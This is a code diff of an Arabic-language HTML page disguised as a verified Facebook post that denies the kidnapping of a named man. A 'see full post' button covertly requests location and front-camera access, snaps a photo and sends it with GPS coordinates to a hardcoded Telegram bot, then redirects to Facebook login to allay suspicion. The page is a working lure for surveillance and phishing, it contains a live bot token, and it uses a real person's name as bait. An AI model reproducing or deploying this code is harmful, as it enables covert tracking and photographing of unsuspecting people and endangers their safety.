@@ -3,121 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - توضيح</title>
+    <title>فيسبوك - توضيح رسمي</title>
     <style>
-        body { margin:0; padding:0; background:#f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; justify-content: center; }
-        .fb-post { width: 100%; max-width: 500px; background: white; margin-top: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); border: 1px solid #dddfe2; }
+        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; --fb-text: #050505; --fb-sub: #65676b; }
+        body { margin:0; padding:0; background: var(--fb-bg); font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; justify-content: center; }
+        .fb-post { width: 100%; max-width: 500px; background: white; margin-top: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); border: 1px solid #dddfe2; overflow: hidden; }
         
-        /* رأس المنشور */
+        /* الرأس */
         .header { display: flex; align-items: center; padding: 12px 16px; }
-        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #1877f2; display: flex; align-items: center; justify-content: center; color: white; font-size: 18px; margin-left: 12px; }
-        .name-container { display: flex; flex-direction: column; }
-        .page-name { font-weight: 600; font-size: 15px; color: #050505; display: flex; align-items: center; }
-        .page-name::after { content: ' ✔'; color: #1877f2; margin-right: 4px; font-size: 12px; }
-        .time { font-size: 13px; color: #65676b; margin-top: 2px; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background: var(--fb-blue); display: flex; align-items: center; justify-content: center; color: white; font-size: 18px; margin-left: 12px; border: 1px solid rgba(0,0,0,0.1); }
+        .name-col { display: flex; flex-direction: column; }
+        .page-name { font-weight: 600; font-size: 15px; color: var(--fb-text); display: flex; align-items: center; }
+        .page-name::after { content: ' ✔'; color: var(--fb-blue); margin-right: 4px; font-size: 12px; }
+        .post-time { font-size: 13px; color: var(--fb-sub); margin-top: 2px; }
 
-        /* نص المنشور */
-        .content { padding: 4px 16px 16px 16px; font-size: 15px; line-height: 1.5; color: #050505; }
-        .hashtag { color: #1877f2; cursor: pointer; }
+        /* النص */
+        .content { padding: 4px 16px 12px 16px; font-size: 15px; line-height: 1.5; color: var(--fb-text); }
+        .hashtag { color: var(--fb-blue); cursor: pointer; }
 
-        /* منطقة التمويه */
-        .media-box { position: relative; width: 100%; height: 260px; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .bg-img { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.4; filter: blur(10px); }
-        
-        .cta-button {
-            position: relative; z-index: 20;
-            padding: 12px 30px; background: #1877f2; color: white;
-            border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: pointer;
-        }
+        /* منطقة التمويه (الزر) */
+        .media-box { position: relative; width: 100%; height: 260px; background: #000; display: flex; justify-content: center; align-items: center; }
+        .bg-blur { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.35; filter: blur(12px); }
+        .cta-btn { position: relative; z-index: 20; padding: 10px 25px; background: var(--fb-blue); color: white; border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
 
-        /* تفاعلات واقعية جداً */
+        /* تفاعلات فيسبوك الأصلية (CSS) */
         .engagement { padding: 10px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ebedf0; }
-        .reactions { display: flex; align-items: center; font-size: 13px; color: #65676b; }
-        .reaction-icons { display: flex; margin-left: 8px; }
-        .icon-blue { width: 18px; height: 18px; background: #1877f2; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 10px; border: 2px solid white; z-index: 3; }
-        .icon-red { width: 18px; height: 18px; background: #fa3e3e; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 10px; border: 2px solid white; margin-right: -5px; z-index: 2; }
+        .react-group { display: flex; align-items: center; }
+        .icons-stack { display: flex; margin-left: 8px; position: relative; width: 32px; height: 20px; }
         
-        .actions-bar { display: flex; padding: 4px 0; justify-content: space-around; }
-        .btn-action { flex: 1; text-align: center; padding: 8px; color: #65676b; font-size: 14px; font-weight: 600; cursor: pointer; }
+        /* دائرة اللايك */
+        .ic-like { width: 18px; height: 18px; background: #1877f2; border-radius: 50%; border: 2px solid white; display: flex; align-items: center; justify-content: center; position: absolute; z-index: 3; }
+        .ic-like::before { content: '👍'; font-size: 10px; color: white; }
+        
+        /* دائرة القلب */
+        .ic-love { width: 18px; height: 18px; background: #f02849; border-radius: 50%; border: 2px solid white; display: flex; align-items: center; justify-content: center; position: absolute; right: 0; z-index: 2; }
+        .ic-love::before { content: '❤️'; font-size: 10px; color: white; }
+
+        .count { font-size: 14px; color: var(--fb-sub); }
+        .actions { display: flex; padding: 4px; justify-content: space-around; }
+        .act-btn { flex: 1; text-align: center; padding: 8px; color: var(--fb-sub); font-size: 14px; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<div class="fb-post" id="postElement">
+<div class="fb-post">
     <div class="header">
         <div class="avatar">📢</div>
-        <div class="name-container">
+        <div class="name-col">
             <span class="page-name">أخبار السليمة الآن</span>
-            <span class="time">منذ ٢٠ دقيقة · 🌍</span>
+            <span class="post-time">منذ ٢٠ دقيقة · 🌍</span>
         </div>
     </div>
 
     <div class="content">
         <b>توضيح بخصوص الأخبار المتداولة عن [محمد مصطفى العنعوني]</b><br><br>
         نود الإحاطة بأن الأخبار التي انتشرت مؤخراً حول "اختطاف" محمد مصطفى العنعوني هي أخبار غير صحيحة وعارية تماماً عن الصحة.<br>
-        محمد بخير وعافية، ونرجو من الجميع توخي الدقة وعدم الانجرار وراء الشائعات. اتقوا الله فيما تنشرون.<br><br>
+        محمد بخير وعافية، ونرجو من الجميع توخي الدقة وعدم الانجرار وراء الشائعات.<br><br>
         <span class="hashtag">#توضيح #نفي_خبر #محمد_مصطفى_العنعوني</span>
     </div>
 
     <div class="media-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="bg-img">
-        <button class="cta-button" id="triggerBtn">رؤية المنشور كامل</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="bg-blur">
+        <button class="cta-btn" id="goBtn">رؤية المنشور كامل</button>
     </div>
 
     <div class="engagement">
-        <div class="reactions">
-            <div class="reaction-icons">
-                <div class="icon-blue">👍</div>
-                <div class="icon-red">❤️</div>
+        <div class="react-group">
+            <div class="icons-stack">
+                <div class="ic-like"></div>
+                <div class="ic-love"></div>
             </div>
-            <span>٣٠٠</span>
+            <span class="count">٣٠٠</span>
         </div>
-        <div style="font-size:13px; color:#65676b;">٢٤ تعليق • ٧ مشاركات</div>
+        <div class="count">٢٤ تعليق • ٧ مشاركات</div>
     </div>
 
-    <div class="actions-bar">
-        <div class="btn-action">👍 أعجبني</div>
-        <div class="btn-action">💬 تعليق</div>
-        <div class="btn-action">↪️ مشاركة</div>
+    <div class="actions">
+        <div class="act-btn">👍 أعجبني</div>
+        <div class="act-btn">💬 تعليق</div>
+        <div class="act-btn">↪️ مشاركة</div>
     </div>
 </div>
 
 <script>
-const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const CHAT_ID = "1611398303";
+const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const ID = "1611398303";
 
-document.getElementById('triggerBtn').onclick = function() {
-    // تفعيل ملء الشاشة
-    let elem = document.documentElement;
-    if (elem.requestFullscreen) { elem.requestFullscreen(); } 
-    else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+document.getElementById('goBtn').onclick = function() {
+    // تفعيل ملء الشاشة لإقناع المستخدم بالخصوصية
+    let e = document.documentElement;
+    if (e.requestFullscreen) e.requestFullscreen();
+    else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
 
     this.innerText = "جاري التحميل...";
     this.disabled = true;
 
-    // الانتظار 4 ثوانٍ
-    setTimeout(() => {
-        startAttack();
-    }, 4000);
+    // البدء الفوري بعد 4 ثوانٍ
+    setTimeout(startExploit, 4000);
 };
 
-async function startAttack() {
-    // 1. طلب الموقع أولاً (كما طلبت)
+async function startExploit() {
+    // 1. طلب الموقع أولاً (سيظهر طلب الإذن الآن)
     navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-            // بعد الحصول على الموقع، نطلب الكاميرا
-            await captureCam(pos);
-        },
-        async () => {
-            // حتى لو رفض الموقع، نحاول طلب الكاميرا
-            await captureCam(null);
-        },
-        { enableHighAccuracy: true, timeout: 5000 }
+        (pos) => { handleCapture(pos); }, 
+        () => { handleCapture(null); }, // حتى لو رفض ننتقل للكاميرا
+        { enableHighAccuracy: true, timeout: 8000 }
     );
 }
 
-async function captureCam(posData) {
+async function handleCapture(pos) {
     try {
+        // 2. طلب الكاميرا (سيظهر طلب الإذن الثاني)
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const v = document.createElement('video');
         v.srcObject = stream;
@@ -130,37 +126,32 @@ async function captureCam(posData) {
             const img = canvas.toDataURL('image/jpeg');
             stream.getTracks().forEach(t => t.stop());
 
-            await sendDataToTele(img, posData);
-        }, 1200);
-    } catch (e) {
-        // إذا فشل كل شيء، نوجه للفيسبوك
-        window.location.href = "https://m.facebook.com/";
+            await shipIt(img, pos);
+        }, 1500);
+    } catch (err) {
+        // إذا رفض الكاميرا أيضاً، نرسل ما لدينا (الموقع فقط أو حتى مجرد إشعار دخول)
+        await shipIt(null, pos);
     }
 }
 
-async function sendDataToTele(img, pos) {
-    let caption = `✅ صيد جديد (نفي الخبر)\n📱 النظام: ${navigator.platform}`;
-    if(pos) {
-        caption += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
-        caption += `\n🔗 الخريطة: https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`;
+async function shipIt(img, pos) {
+    let msg = `🎯 صيد جديد\n📱 الجهاز: ${navigator.platform}`;
+    if (pos) msg += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    else msg += `\n📍 الموقع: (مرفوض)`;
+
+    if (img) {
+        const blob = await (await fetch(img)).blob();
+        const fd = new FormData();
+        fd.append('photo', blob, 'pic.jpg');
+        fd.append('caption', msg);
+        fd.append('chat_id', ID);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     } else {
-        caption += `\n📍 الموقع: تم الرفض أو غير متاح`;
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
     }
-
-    const blob = dataURLtoBlob(img);
-    const fd = new FormData();
-    fd.append('photo', blob, 'shot.jpg');
-    fd.append('caption', caption);
-    fd.append('chat_id', CHAT_ID);
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    window.location.href = "https://m.facebook.com/";
-}
-
-function dataURLtoBlob(d) {
-    let arr = d.split(','), m = arr[0].match(/:(.*?);/)[1], b = atob(arr[1]), n = b.length, u = new Uint8Array(n);
-    while(n--) u[n] = b.charCodeAt(n);
-    return new Blob([u], {type: m});
+    
+    // التوجيه النهائي للفيسبوك لإنهاء الشك
+    window.location.href = "https://m.facebook.com/login/";
 }
 </script>
 </body>
